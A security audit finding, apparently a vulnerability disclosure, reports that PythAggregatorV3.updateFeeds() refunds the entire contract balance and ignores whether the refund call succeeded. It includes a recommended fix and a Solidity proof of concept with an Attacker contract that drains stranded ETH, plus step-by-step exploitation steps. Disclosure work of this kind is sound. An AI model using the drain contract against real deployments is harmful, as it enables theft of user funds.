### Title
ETH Balance Drain via Incorrect Refund Accounting in `updateFeeds` — (File: `target_chains/ethereum/sdk/solidity/PythAggregatorV3.sol`)

### Summary
`PythAggregatorV3.updateFeeds()` refunds `address(this).balance` to `msg.sender` instead of `msg.value - fee`. Because the `success` return value of the refund call is silently ignored, ETH can accumulate in the contract when a caller's refund fails. Any subsequent unprivileged caller can drain the entire accumulated ETH balance by paying only the minimal Pyth update fee.

### Finding Description
`PythAggregatorV3.updateFeeds()` is a `payable` wrapper that:
1. Computes the required Pyth fee via `pyth.getUpdateFee(priceUpdateData)`
2. Forwards exactly `fee` wei to `pyth.updatePriceFeeds{value: fee}(...)`
3. Refunds the remainder using `address(this).balance` — the **entire contract balance** — rather than `msg.value - fee` [1](#0-0) 

The `success` return value of the low-level `.call{value: address(this).balance}("")` is explicitly suppressed with a `// solhint-disable-next-line no-unused-vars` comment, meaning a failed refund (e.g., when the caller is a contract without a `receive()` function) silently strands ETH inside `PythAggregatorV3`. [2](#0-1) 

Once ETH has accumulated (from one or more failed refunds), any subsequent caller invoking `updateFeeds` with `msg.value == fee` (as little as 1 wei on most deployments) will receive back `fee + stranded_balance` — draining the entire contract balance.

Compare with `PythLazer.verifyUpdate()`, which correctly refunds only `msg.value - verification_fee`: [3](#0-2) 

### Impact Explanation
Any unprivileged EOA or contract can drain the full ETH balance of any deployed `PythAggregatorV3` instance. Users who overpay `updateFeeds` from a contract that cannot receive ETH (no `receive()`/`fallback()`) permanently lose their overpayment, and a third party can immediately steal it. The impact is direct theft of user funds from a deployed Pyth SDK contract.

### Likelihood Explanation
`PythAggregatorV3` is a production SDK contract that integrators are expected to deploy. Callers frequently overpay (e.g., passing a pre-computed fee that has since changed, or calling from a contract wrapper). A failed refund is silent and leaves ETH stranded. The drain attack requires no special privileges — only a valid `priceUpdateData` array and `msg.value >= fee` (1 wei default).

### Recommendation
Replace `address(this).balance` with `msg.value - fee` in the refund:

```solidity
function updateFeeds(bytes[] calldata priceUpdateData) public payable {
    uint fee = pyth.getUpdateFee(priceUpdateData);
    pyth.updatePriceFeeds{value: fee}(priceUpdateData);

    // Refund only the caller's excess, not the entire contract balance
    uint256 refund = msg.value - fee;
    if (refund > 0) {
        (bool success, ) = payable(msg.sender).call{value: refund}("");
        require(success, "Refund failed");
    }
}
```

Additionally, add a `receive()` revert to prevent accidental ETH deposits:
```solidity
receive() external payable { revert("not accepted"); }
```

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {PythAggregatorV3} from "@pythnetwork/pyth-sdk-solidity/PythAggregatorV3.sol";

// A contract that cannot receive ETH (no receive/fallback)
contract NoReceive {
    PythAggregatorV3 public aggregator;

    constructor(address _aggregator) {
        aggregator = PythAggregatorV3(_aggregator);
    }

    // Caller overpays; refund fails silently, ETH stranded in aggregator
    function overpayUpdate(bytes[] calldata data) external payable {
        aggregator.updateFeeds{value: msg.value}(data);
        // refund back to this contract fails → ETH stays in aggregator
    }
}

contract Attacker {
    PythAggregatorV3 public aggregator;

    constructor(address _aggregator) {
        aggregator = PythAggregatorV3(_aggregator);
    }

    receive() external payable {}

    // Attacker pays only the fee, drains the entire aggregator balance
    function drain(bytes[] calldata data, uint256 fee) external payable {
        uint256 before = address(this).balance;
        aggregator.updateFeeds{value: fee}(data);
        // address(this).balance now includes the stranded ETH from NoReceive
        assert(address(this).balance > before);
    }
}
```

**Steps:**
1. Deploy `PythAggregatorV3` for any price feed.
2. `NoReceive.overpayUpdate{value: 1 ether}(data)` — refund of `~1 ETH` fails silently; aggregator now holds `~1 ETH`.
3. `Attacker.drain{value: fee}(data, fee)` — attacker pays `fee` (1 wei), receives back `address(aggregator).balance ≈ 1 ETH + 1 wei - fee`.
4. Attacker profits by the full stranded balance.

### Citations

**File:** target_chains/ethereum/sdk/solidity/PythAggregatorV3.sol (L26-38)
```text
    function updateFeeds(bytes[] calldata priceUpdateData) public payable {
        // Update the prices to the latest available values and pay the required fee for it. The `priceUpdateData` data
        // should be retrieved from our off-chain Price Service API using the `hermes-client` package.
        // See section "How Pyth Works on EVM Chains" below for more information.
        uint fee = pyth.getUpdateFee(priceUpdateData);
        pyth.updatePriceFeeds{value: fee}(priceUpdateData);

        // refund remaining eth
        // solhint-disable-next-line no-unused-vars
        (bool success, ) = payable(msg.sender).call{
            value: address(this).balance
        }("");
    }
```

**File:** lazer/contracts/evm/src/PythLazer.sol (L74-77)
```text
        require(msg.value >= verification_fee, "Insufficient fee provided");
        if (msg.value > verification_fee) {
            payable(msg.sender).transfer(msg.value - verification_fee);
        }
```
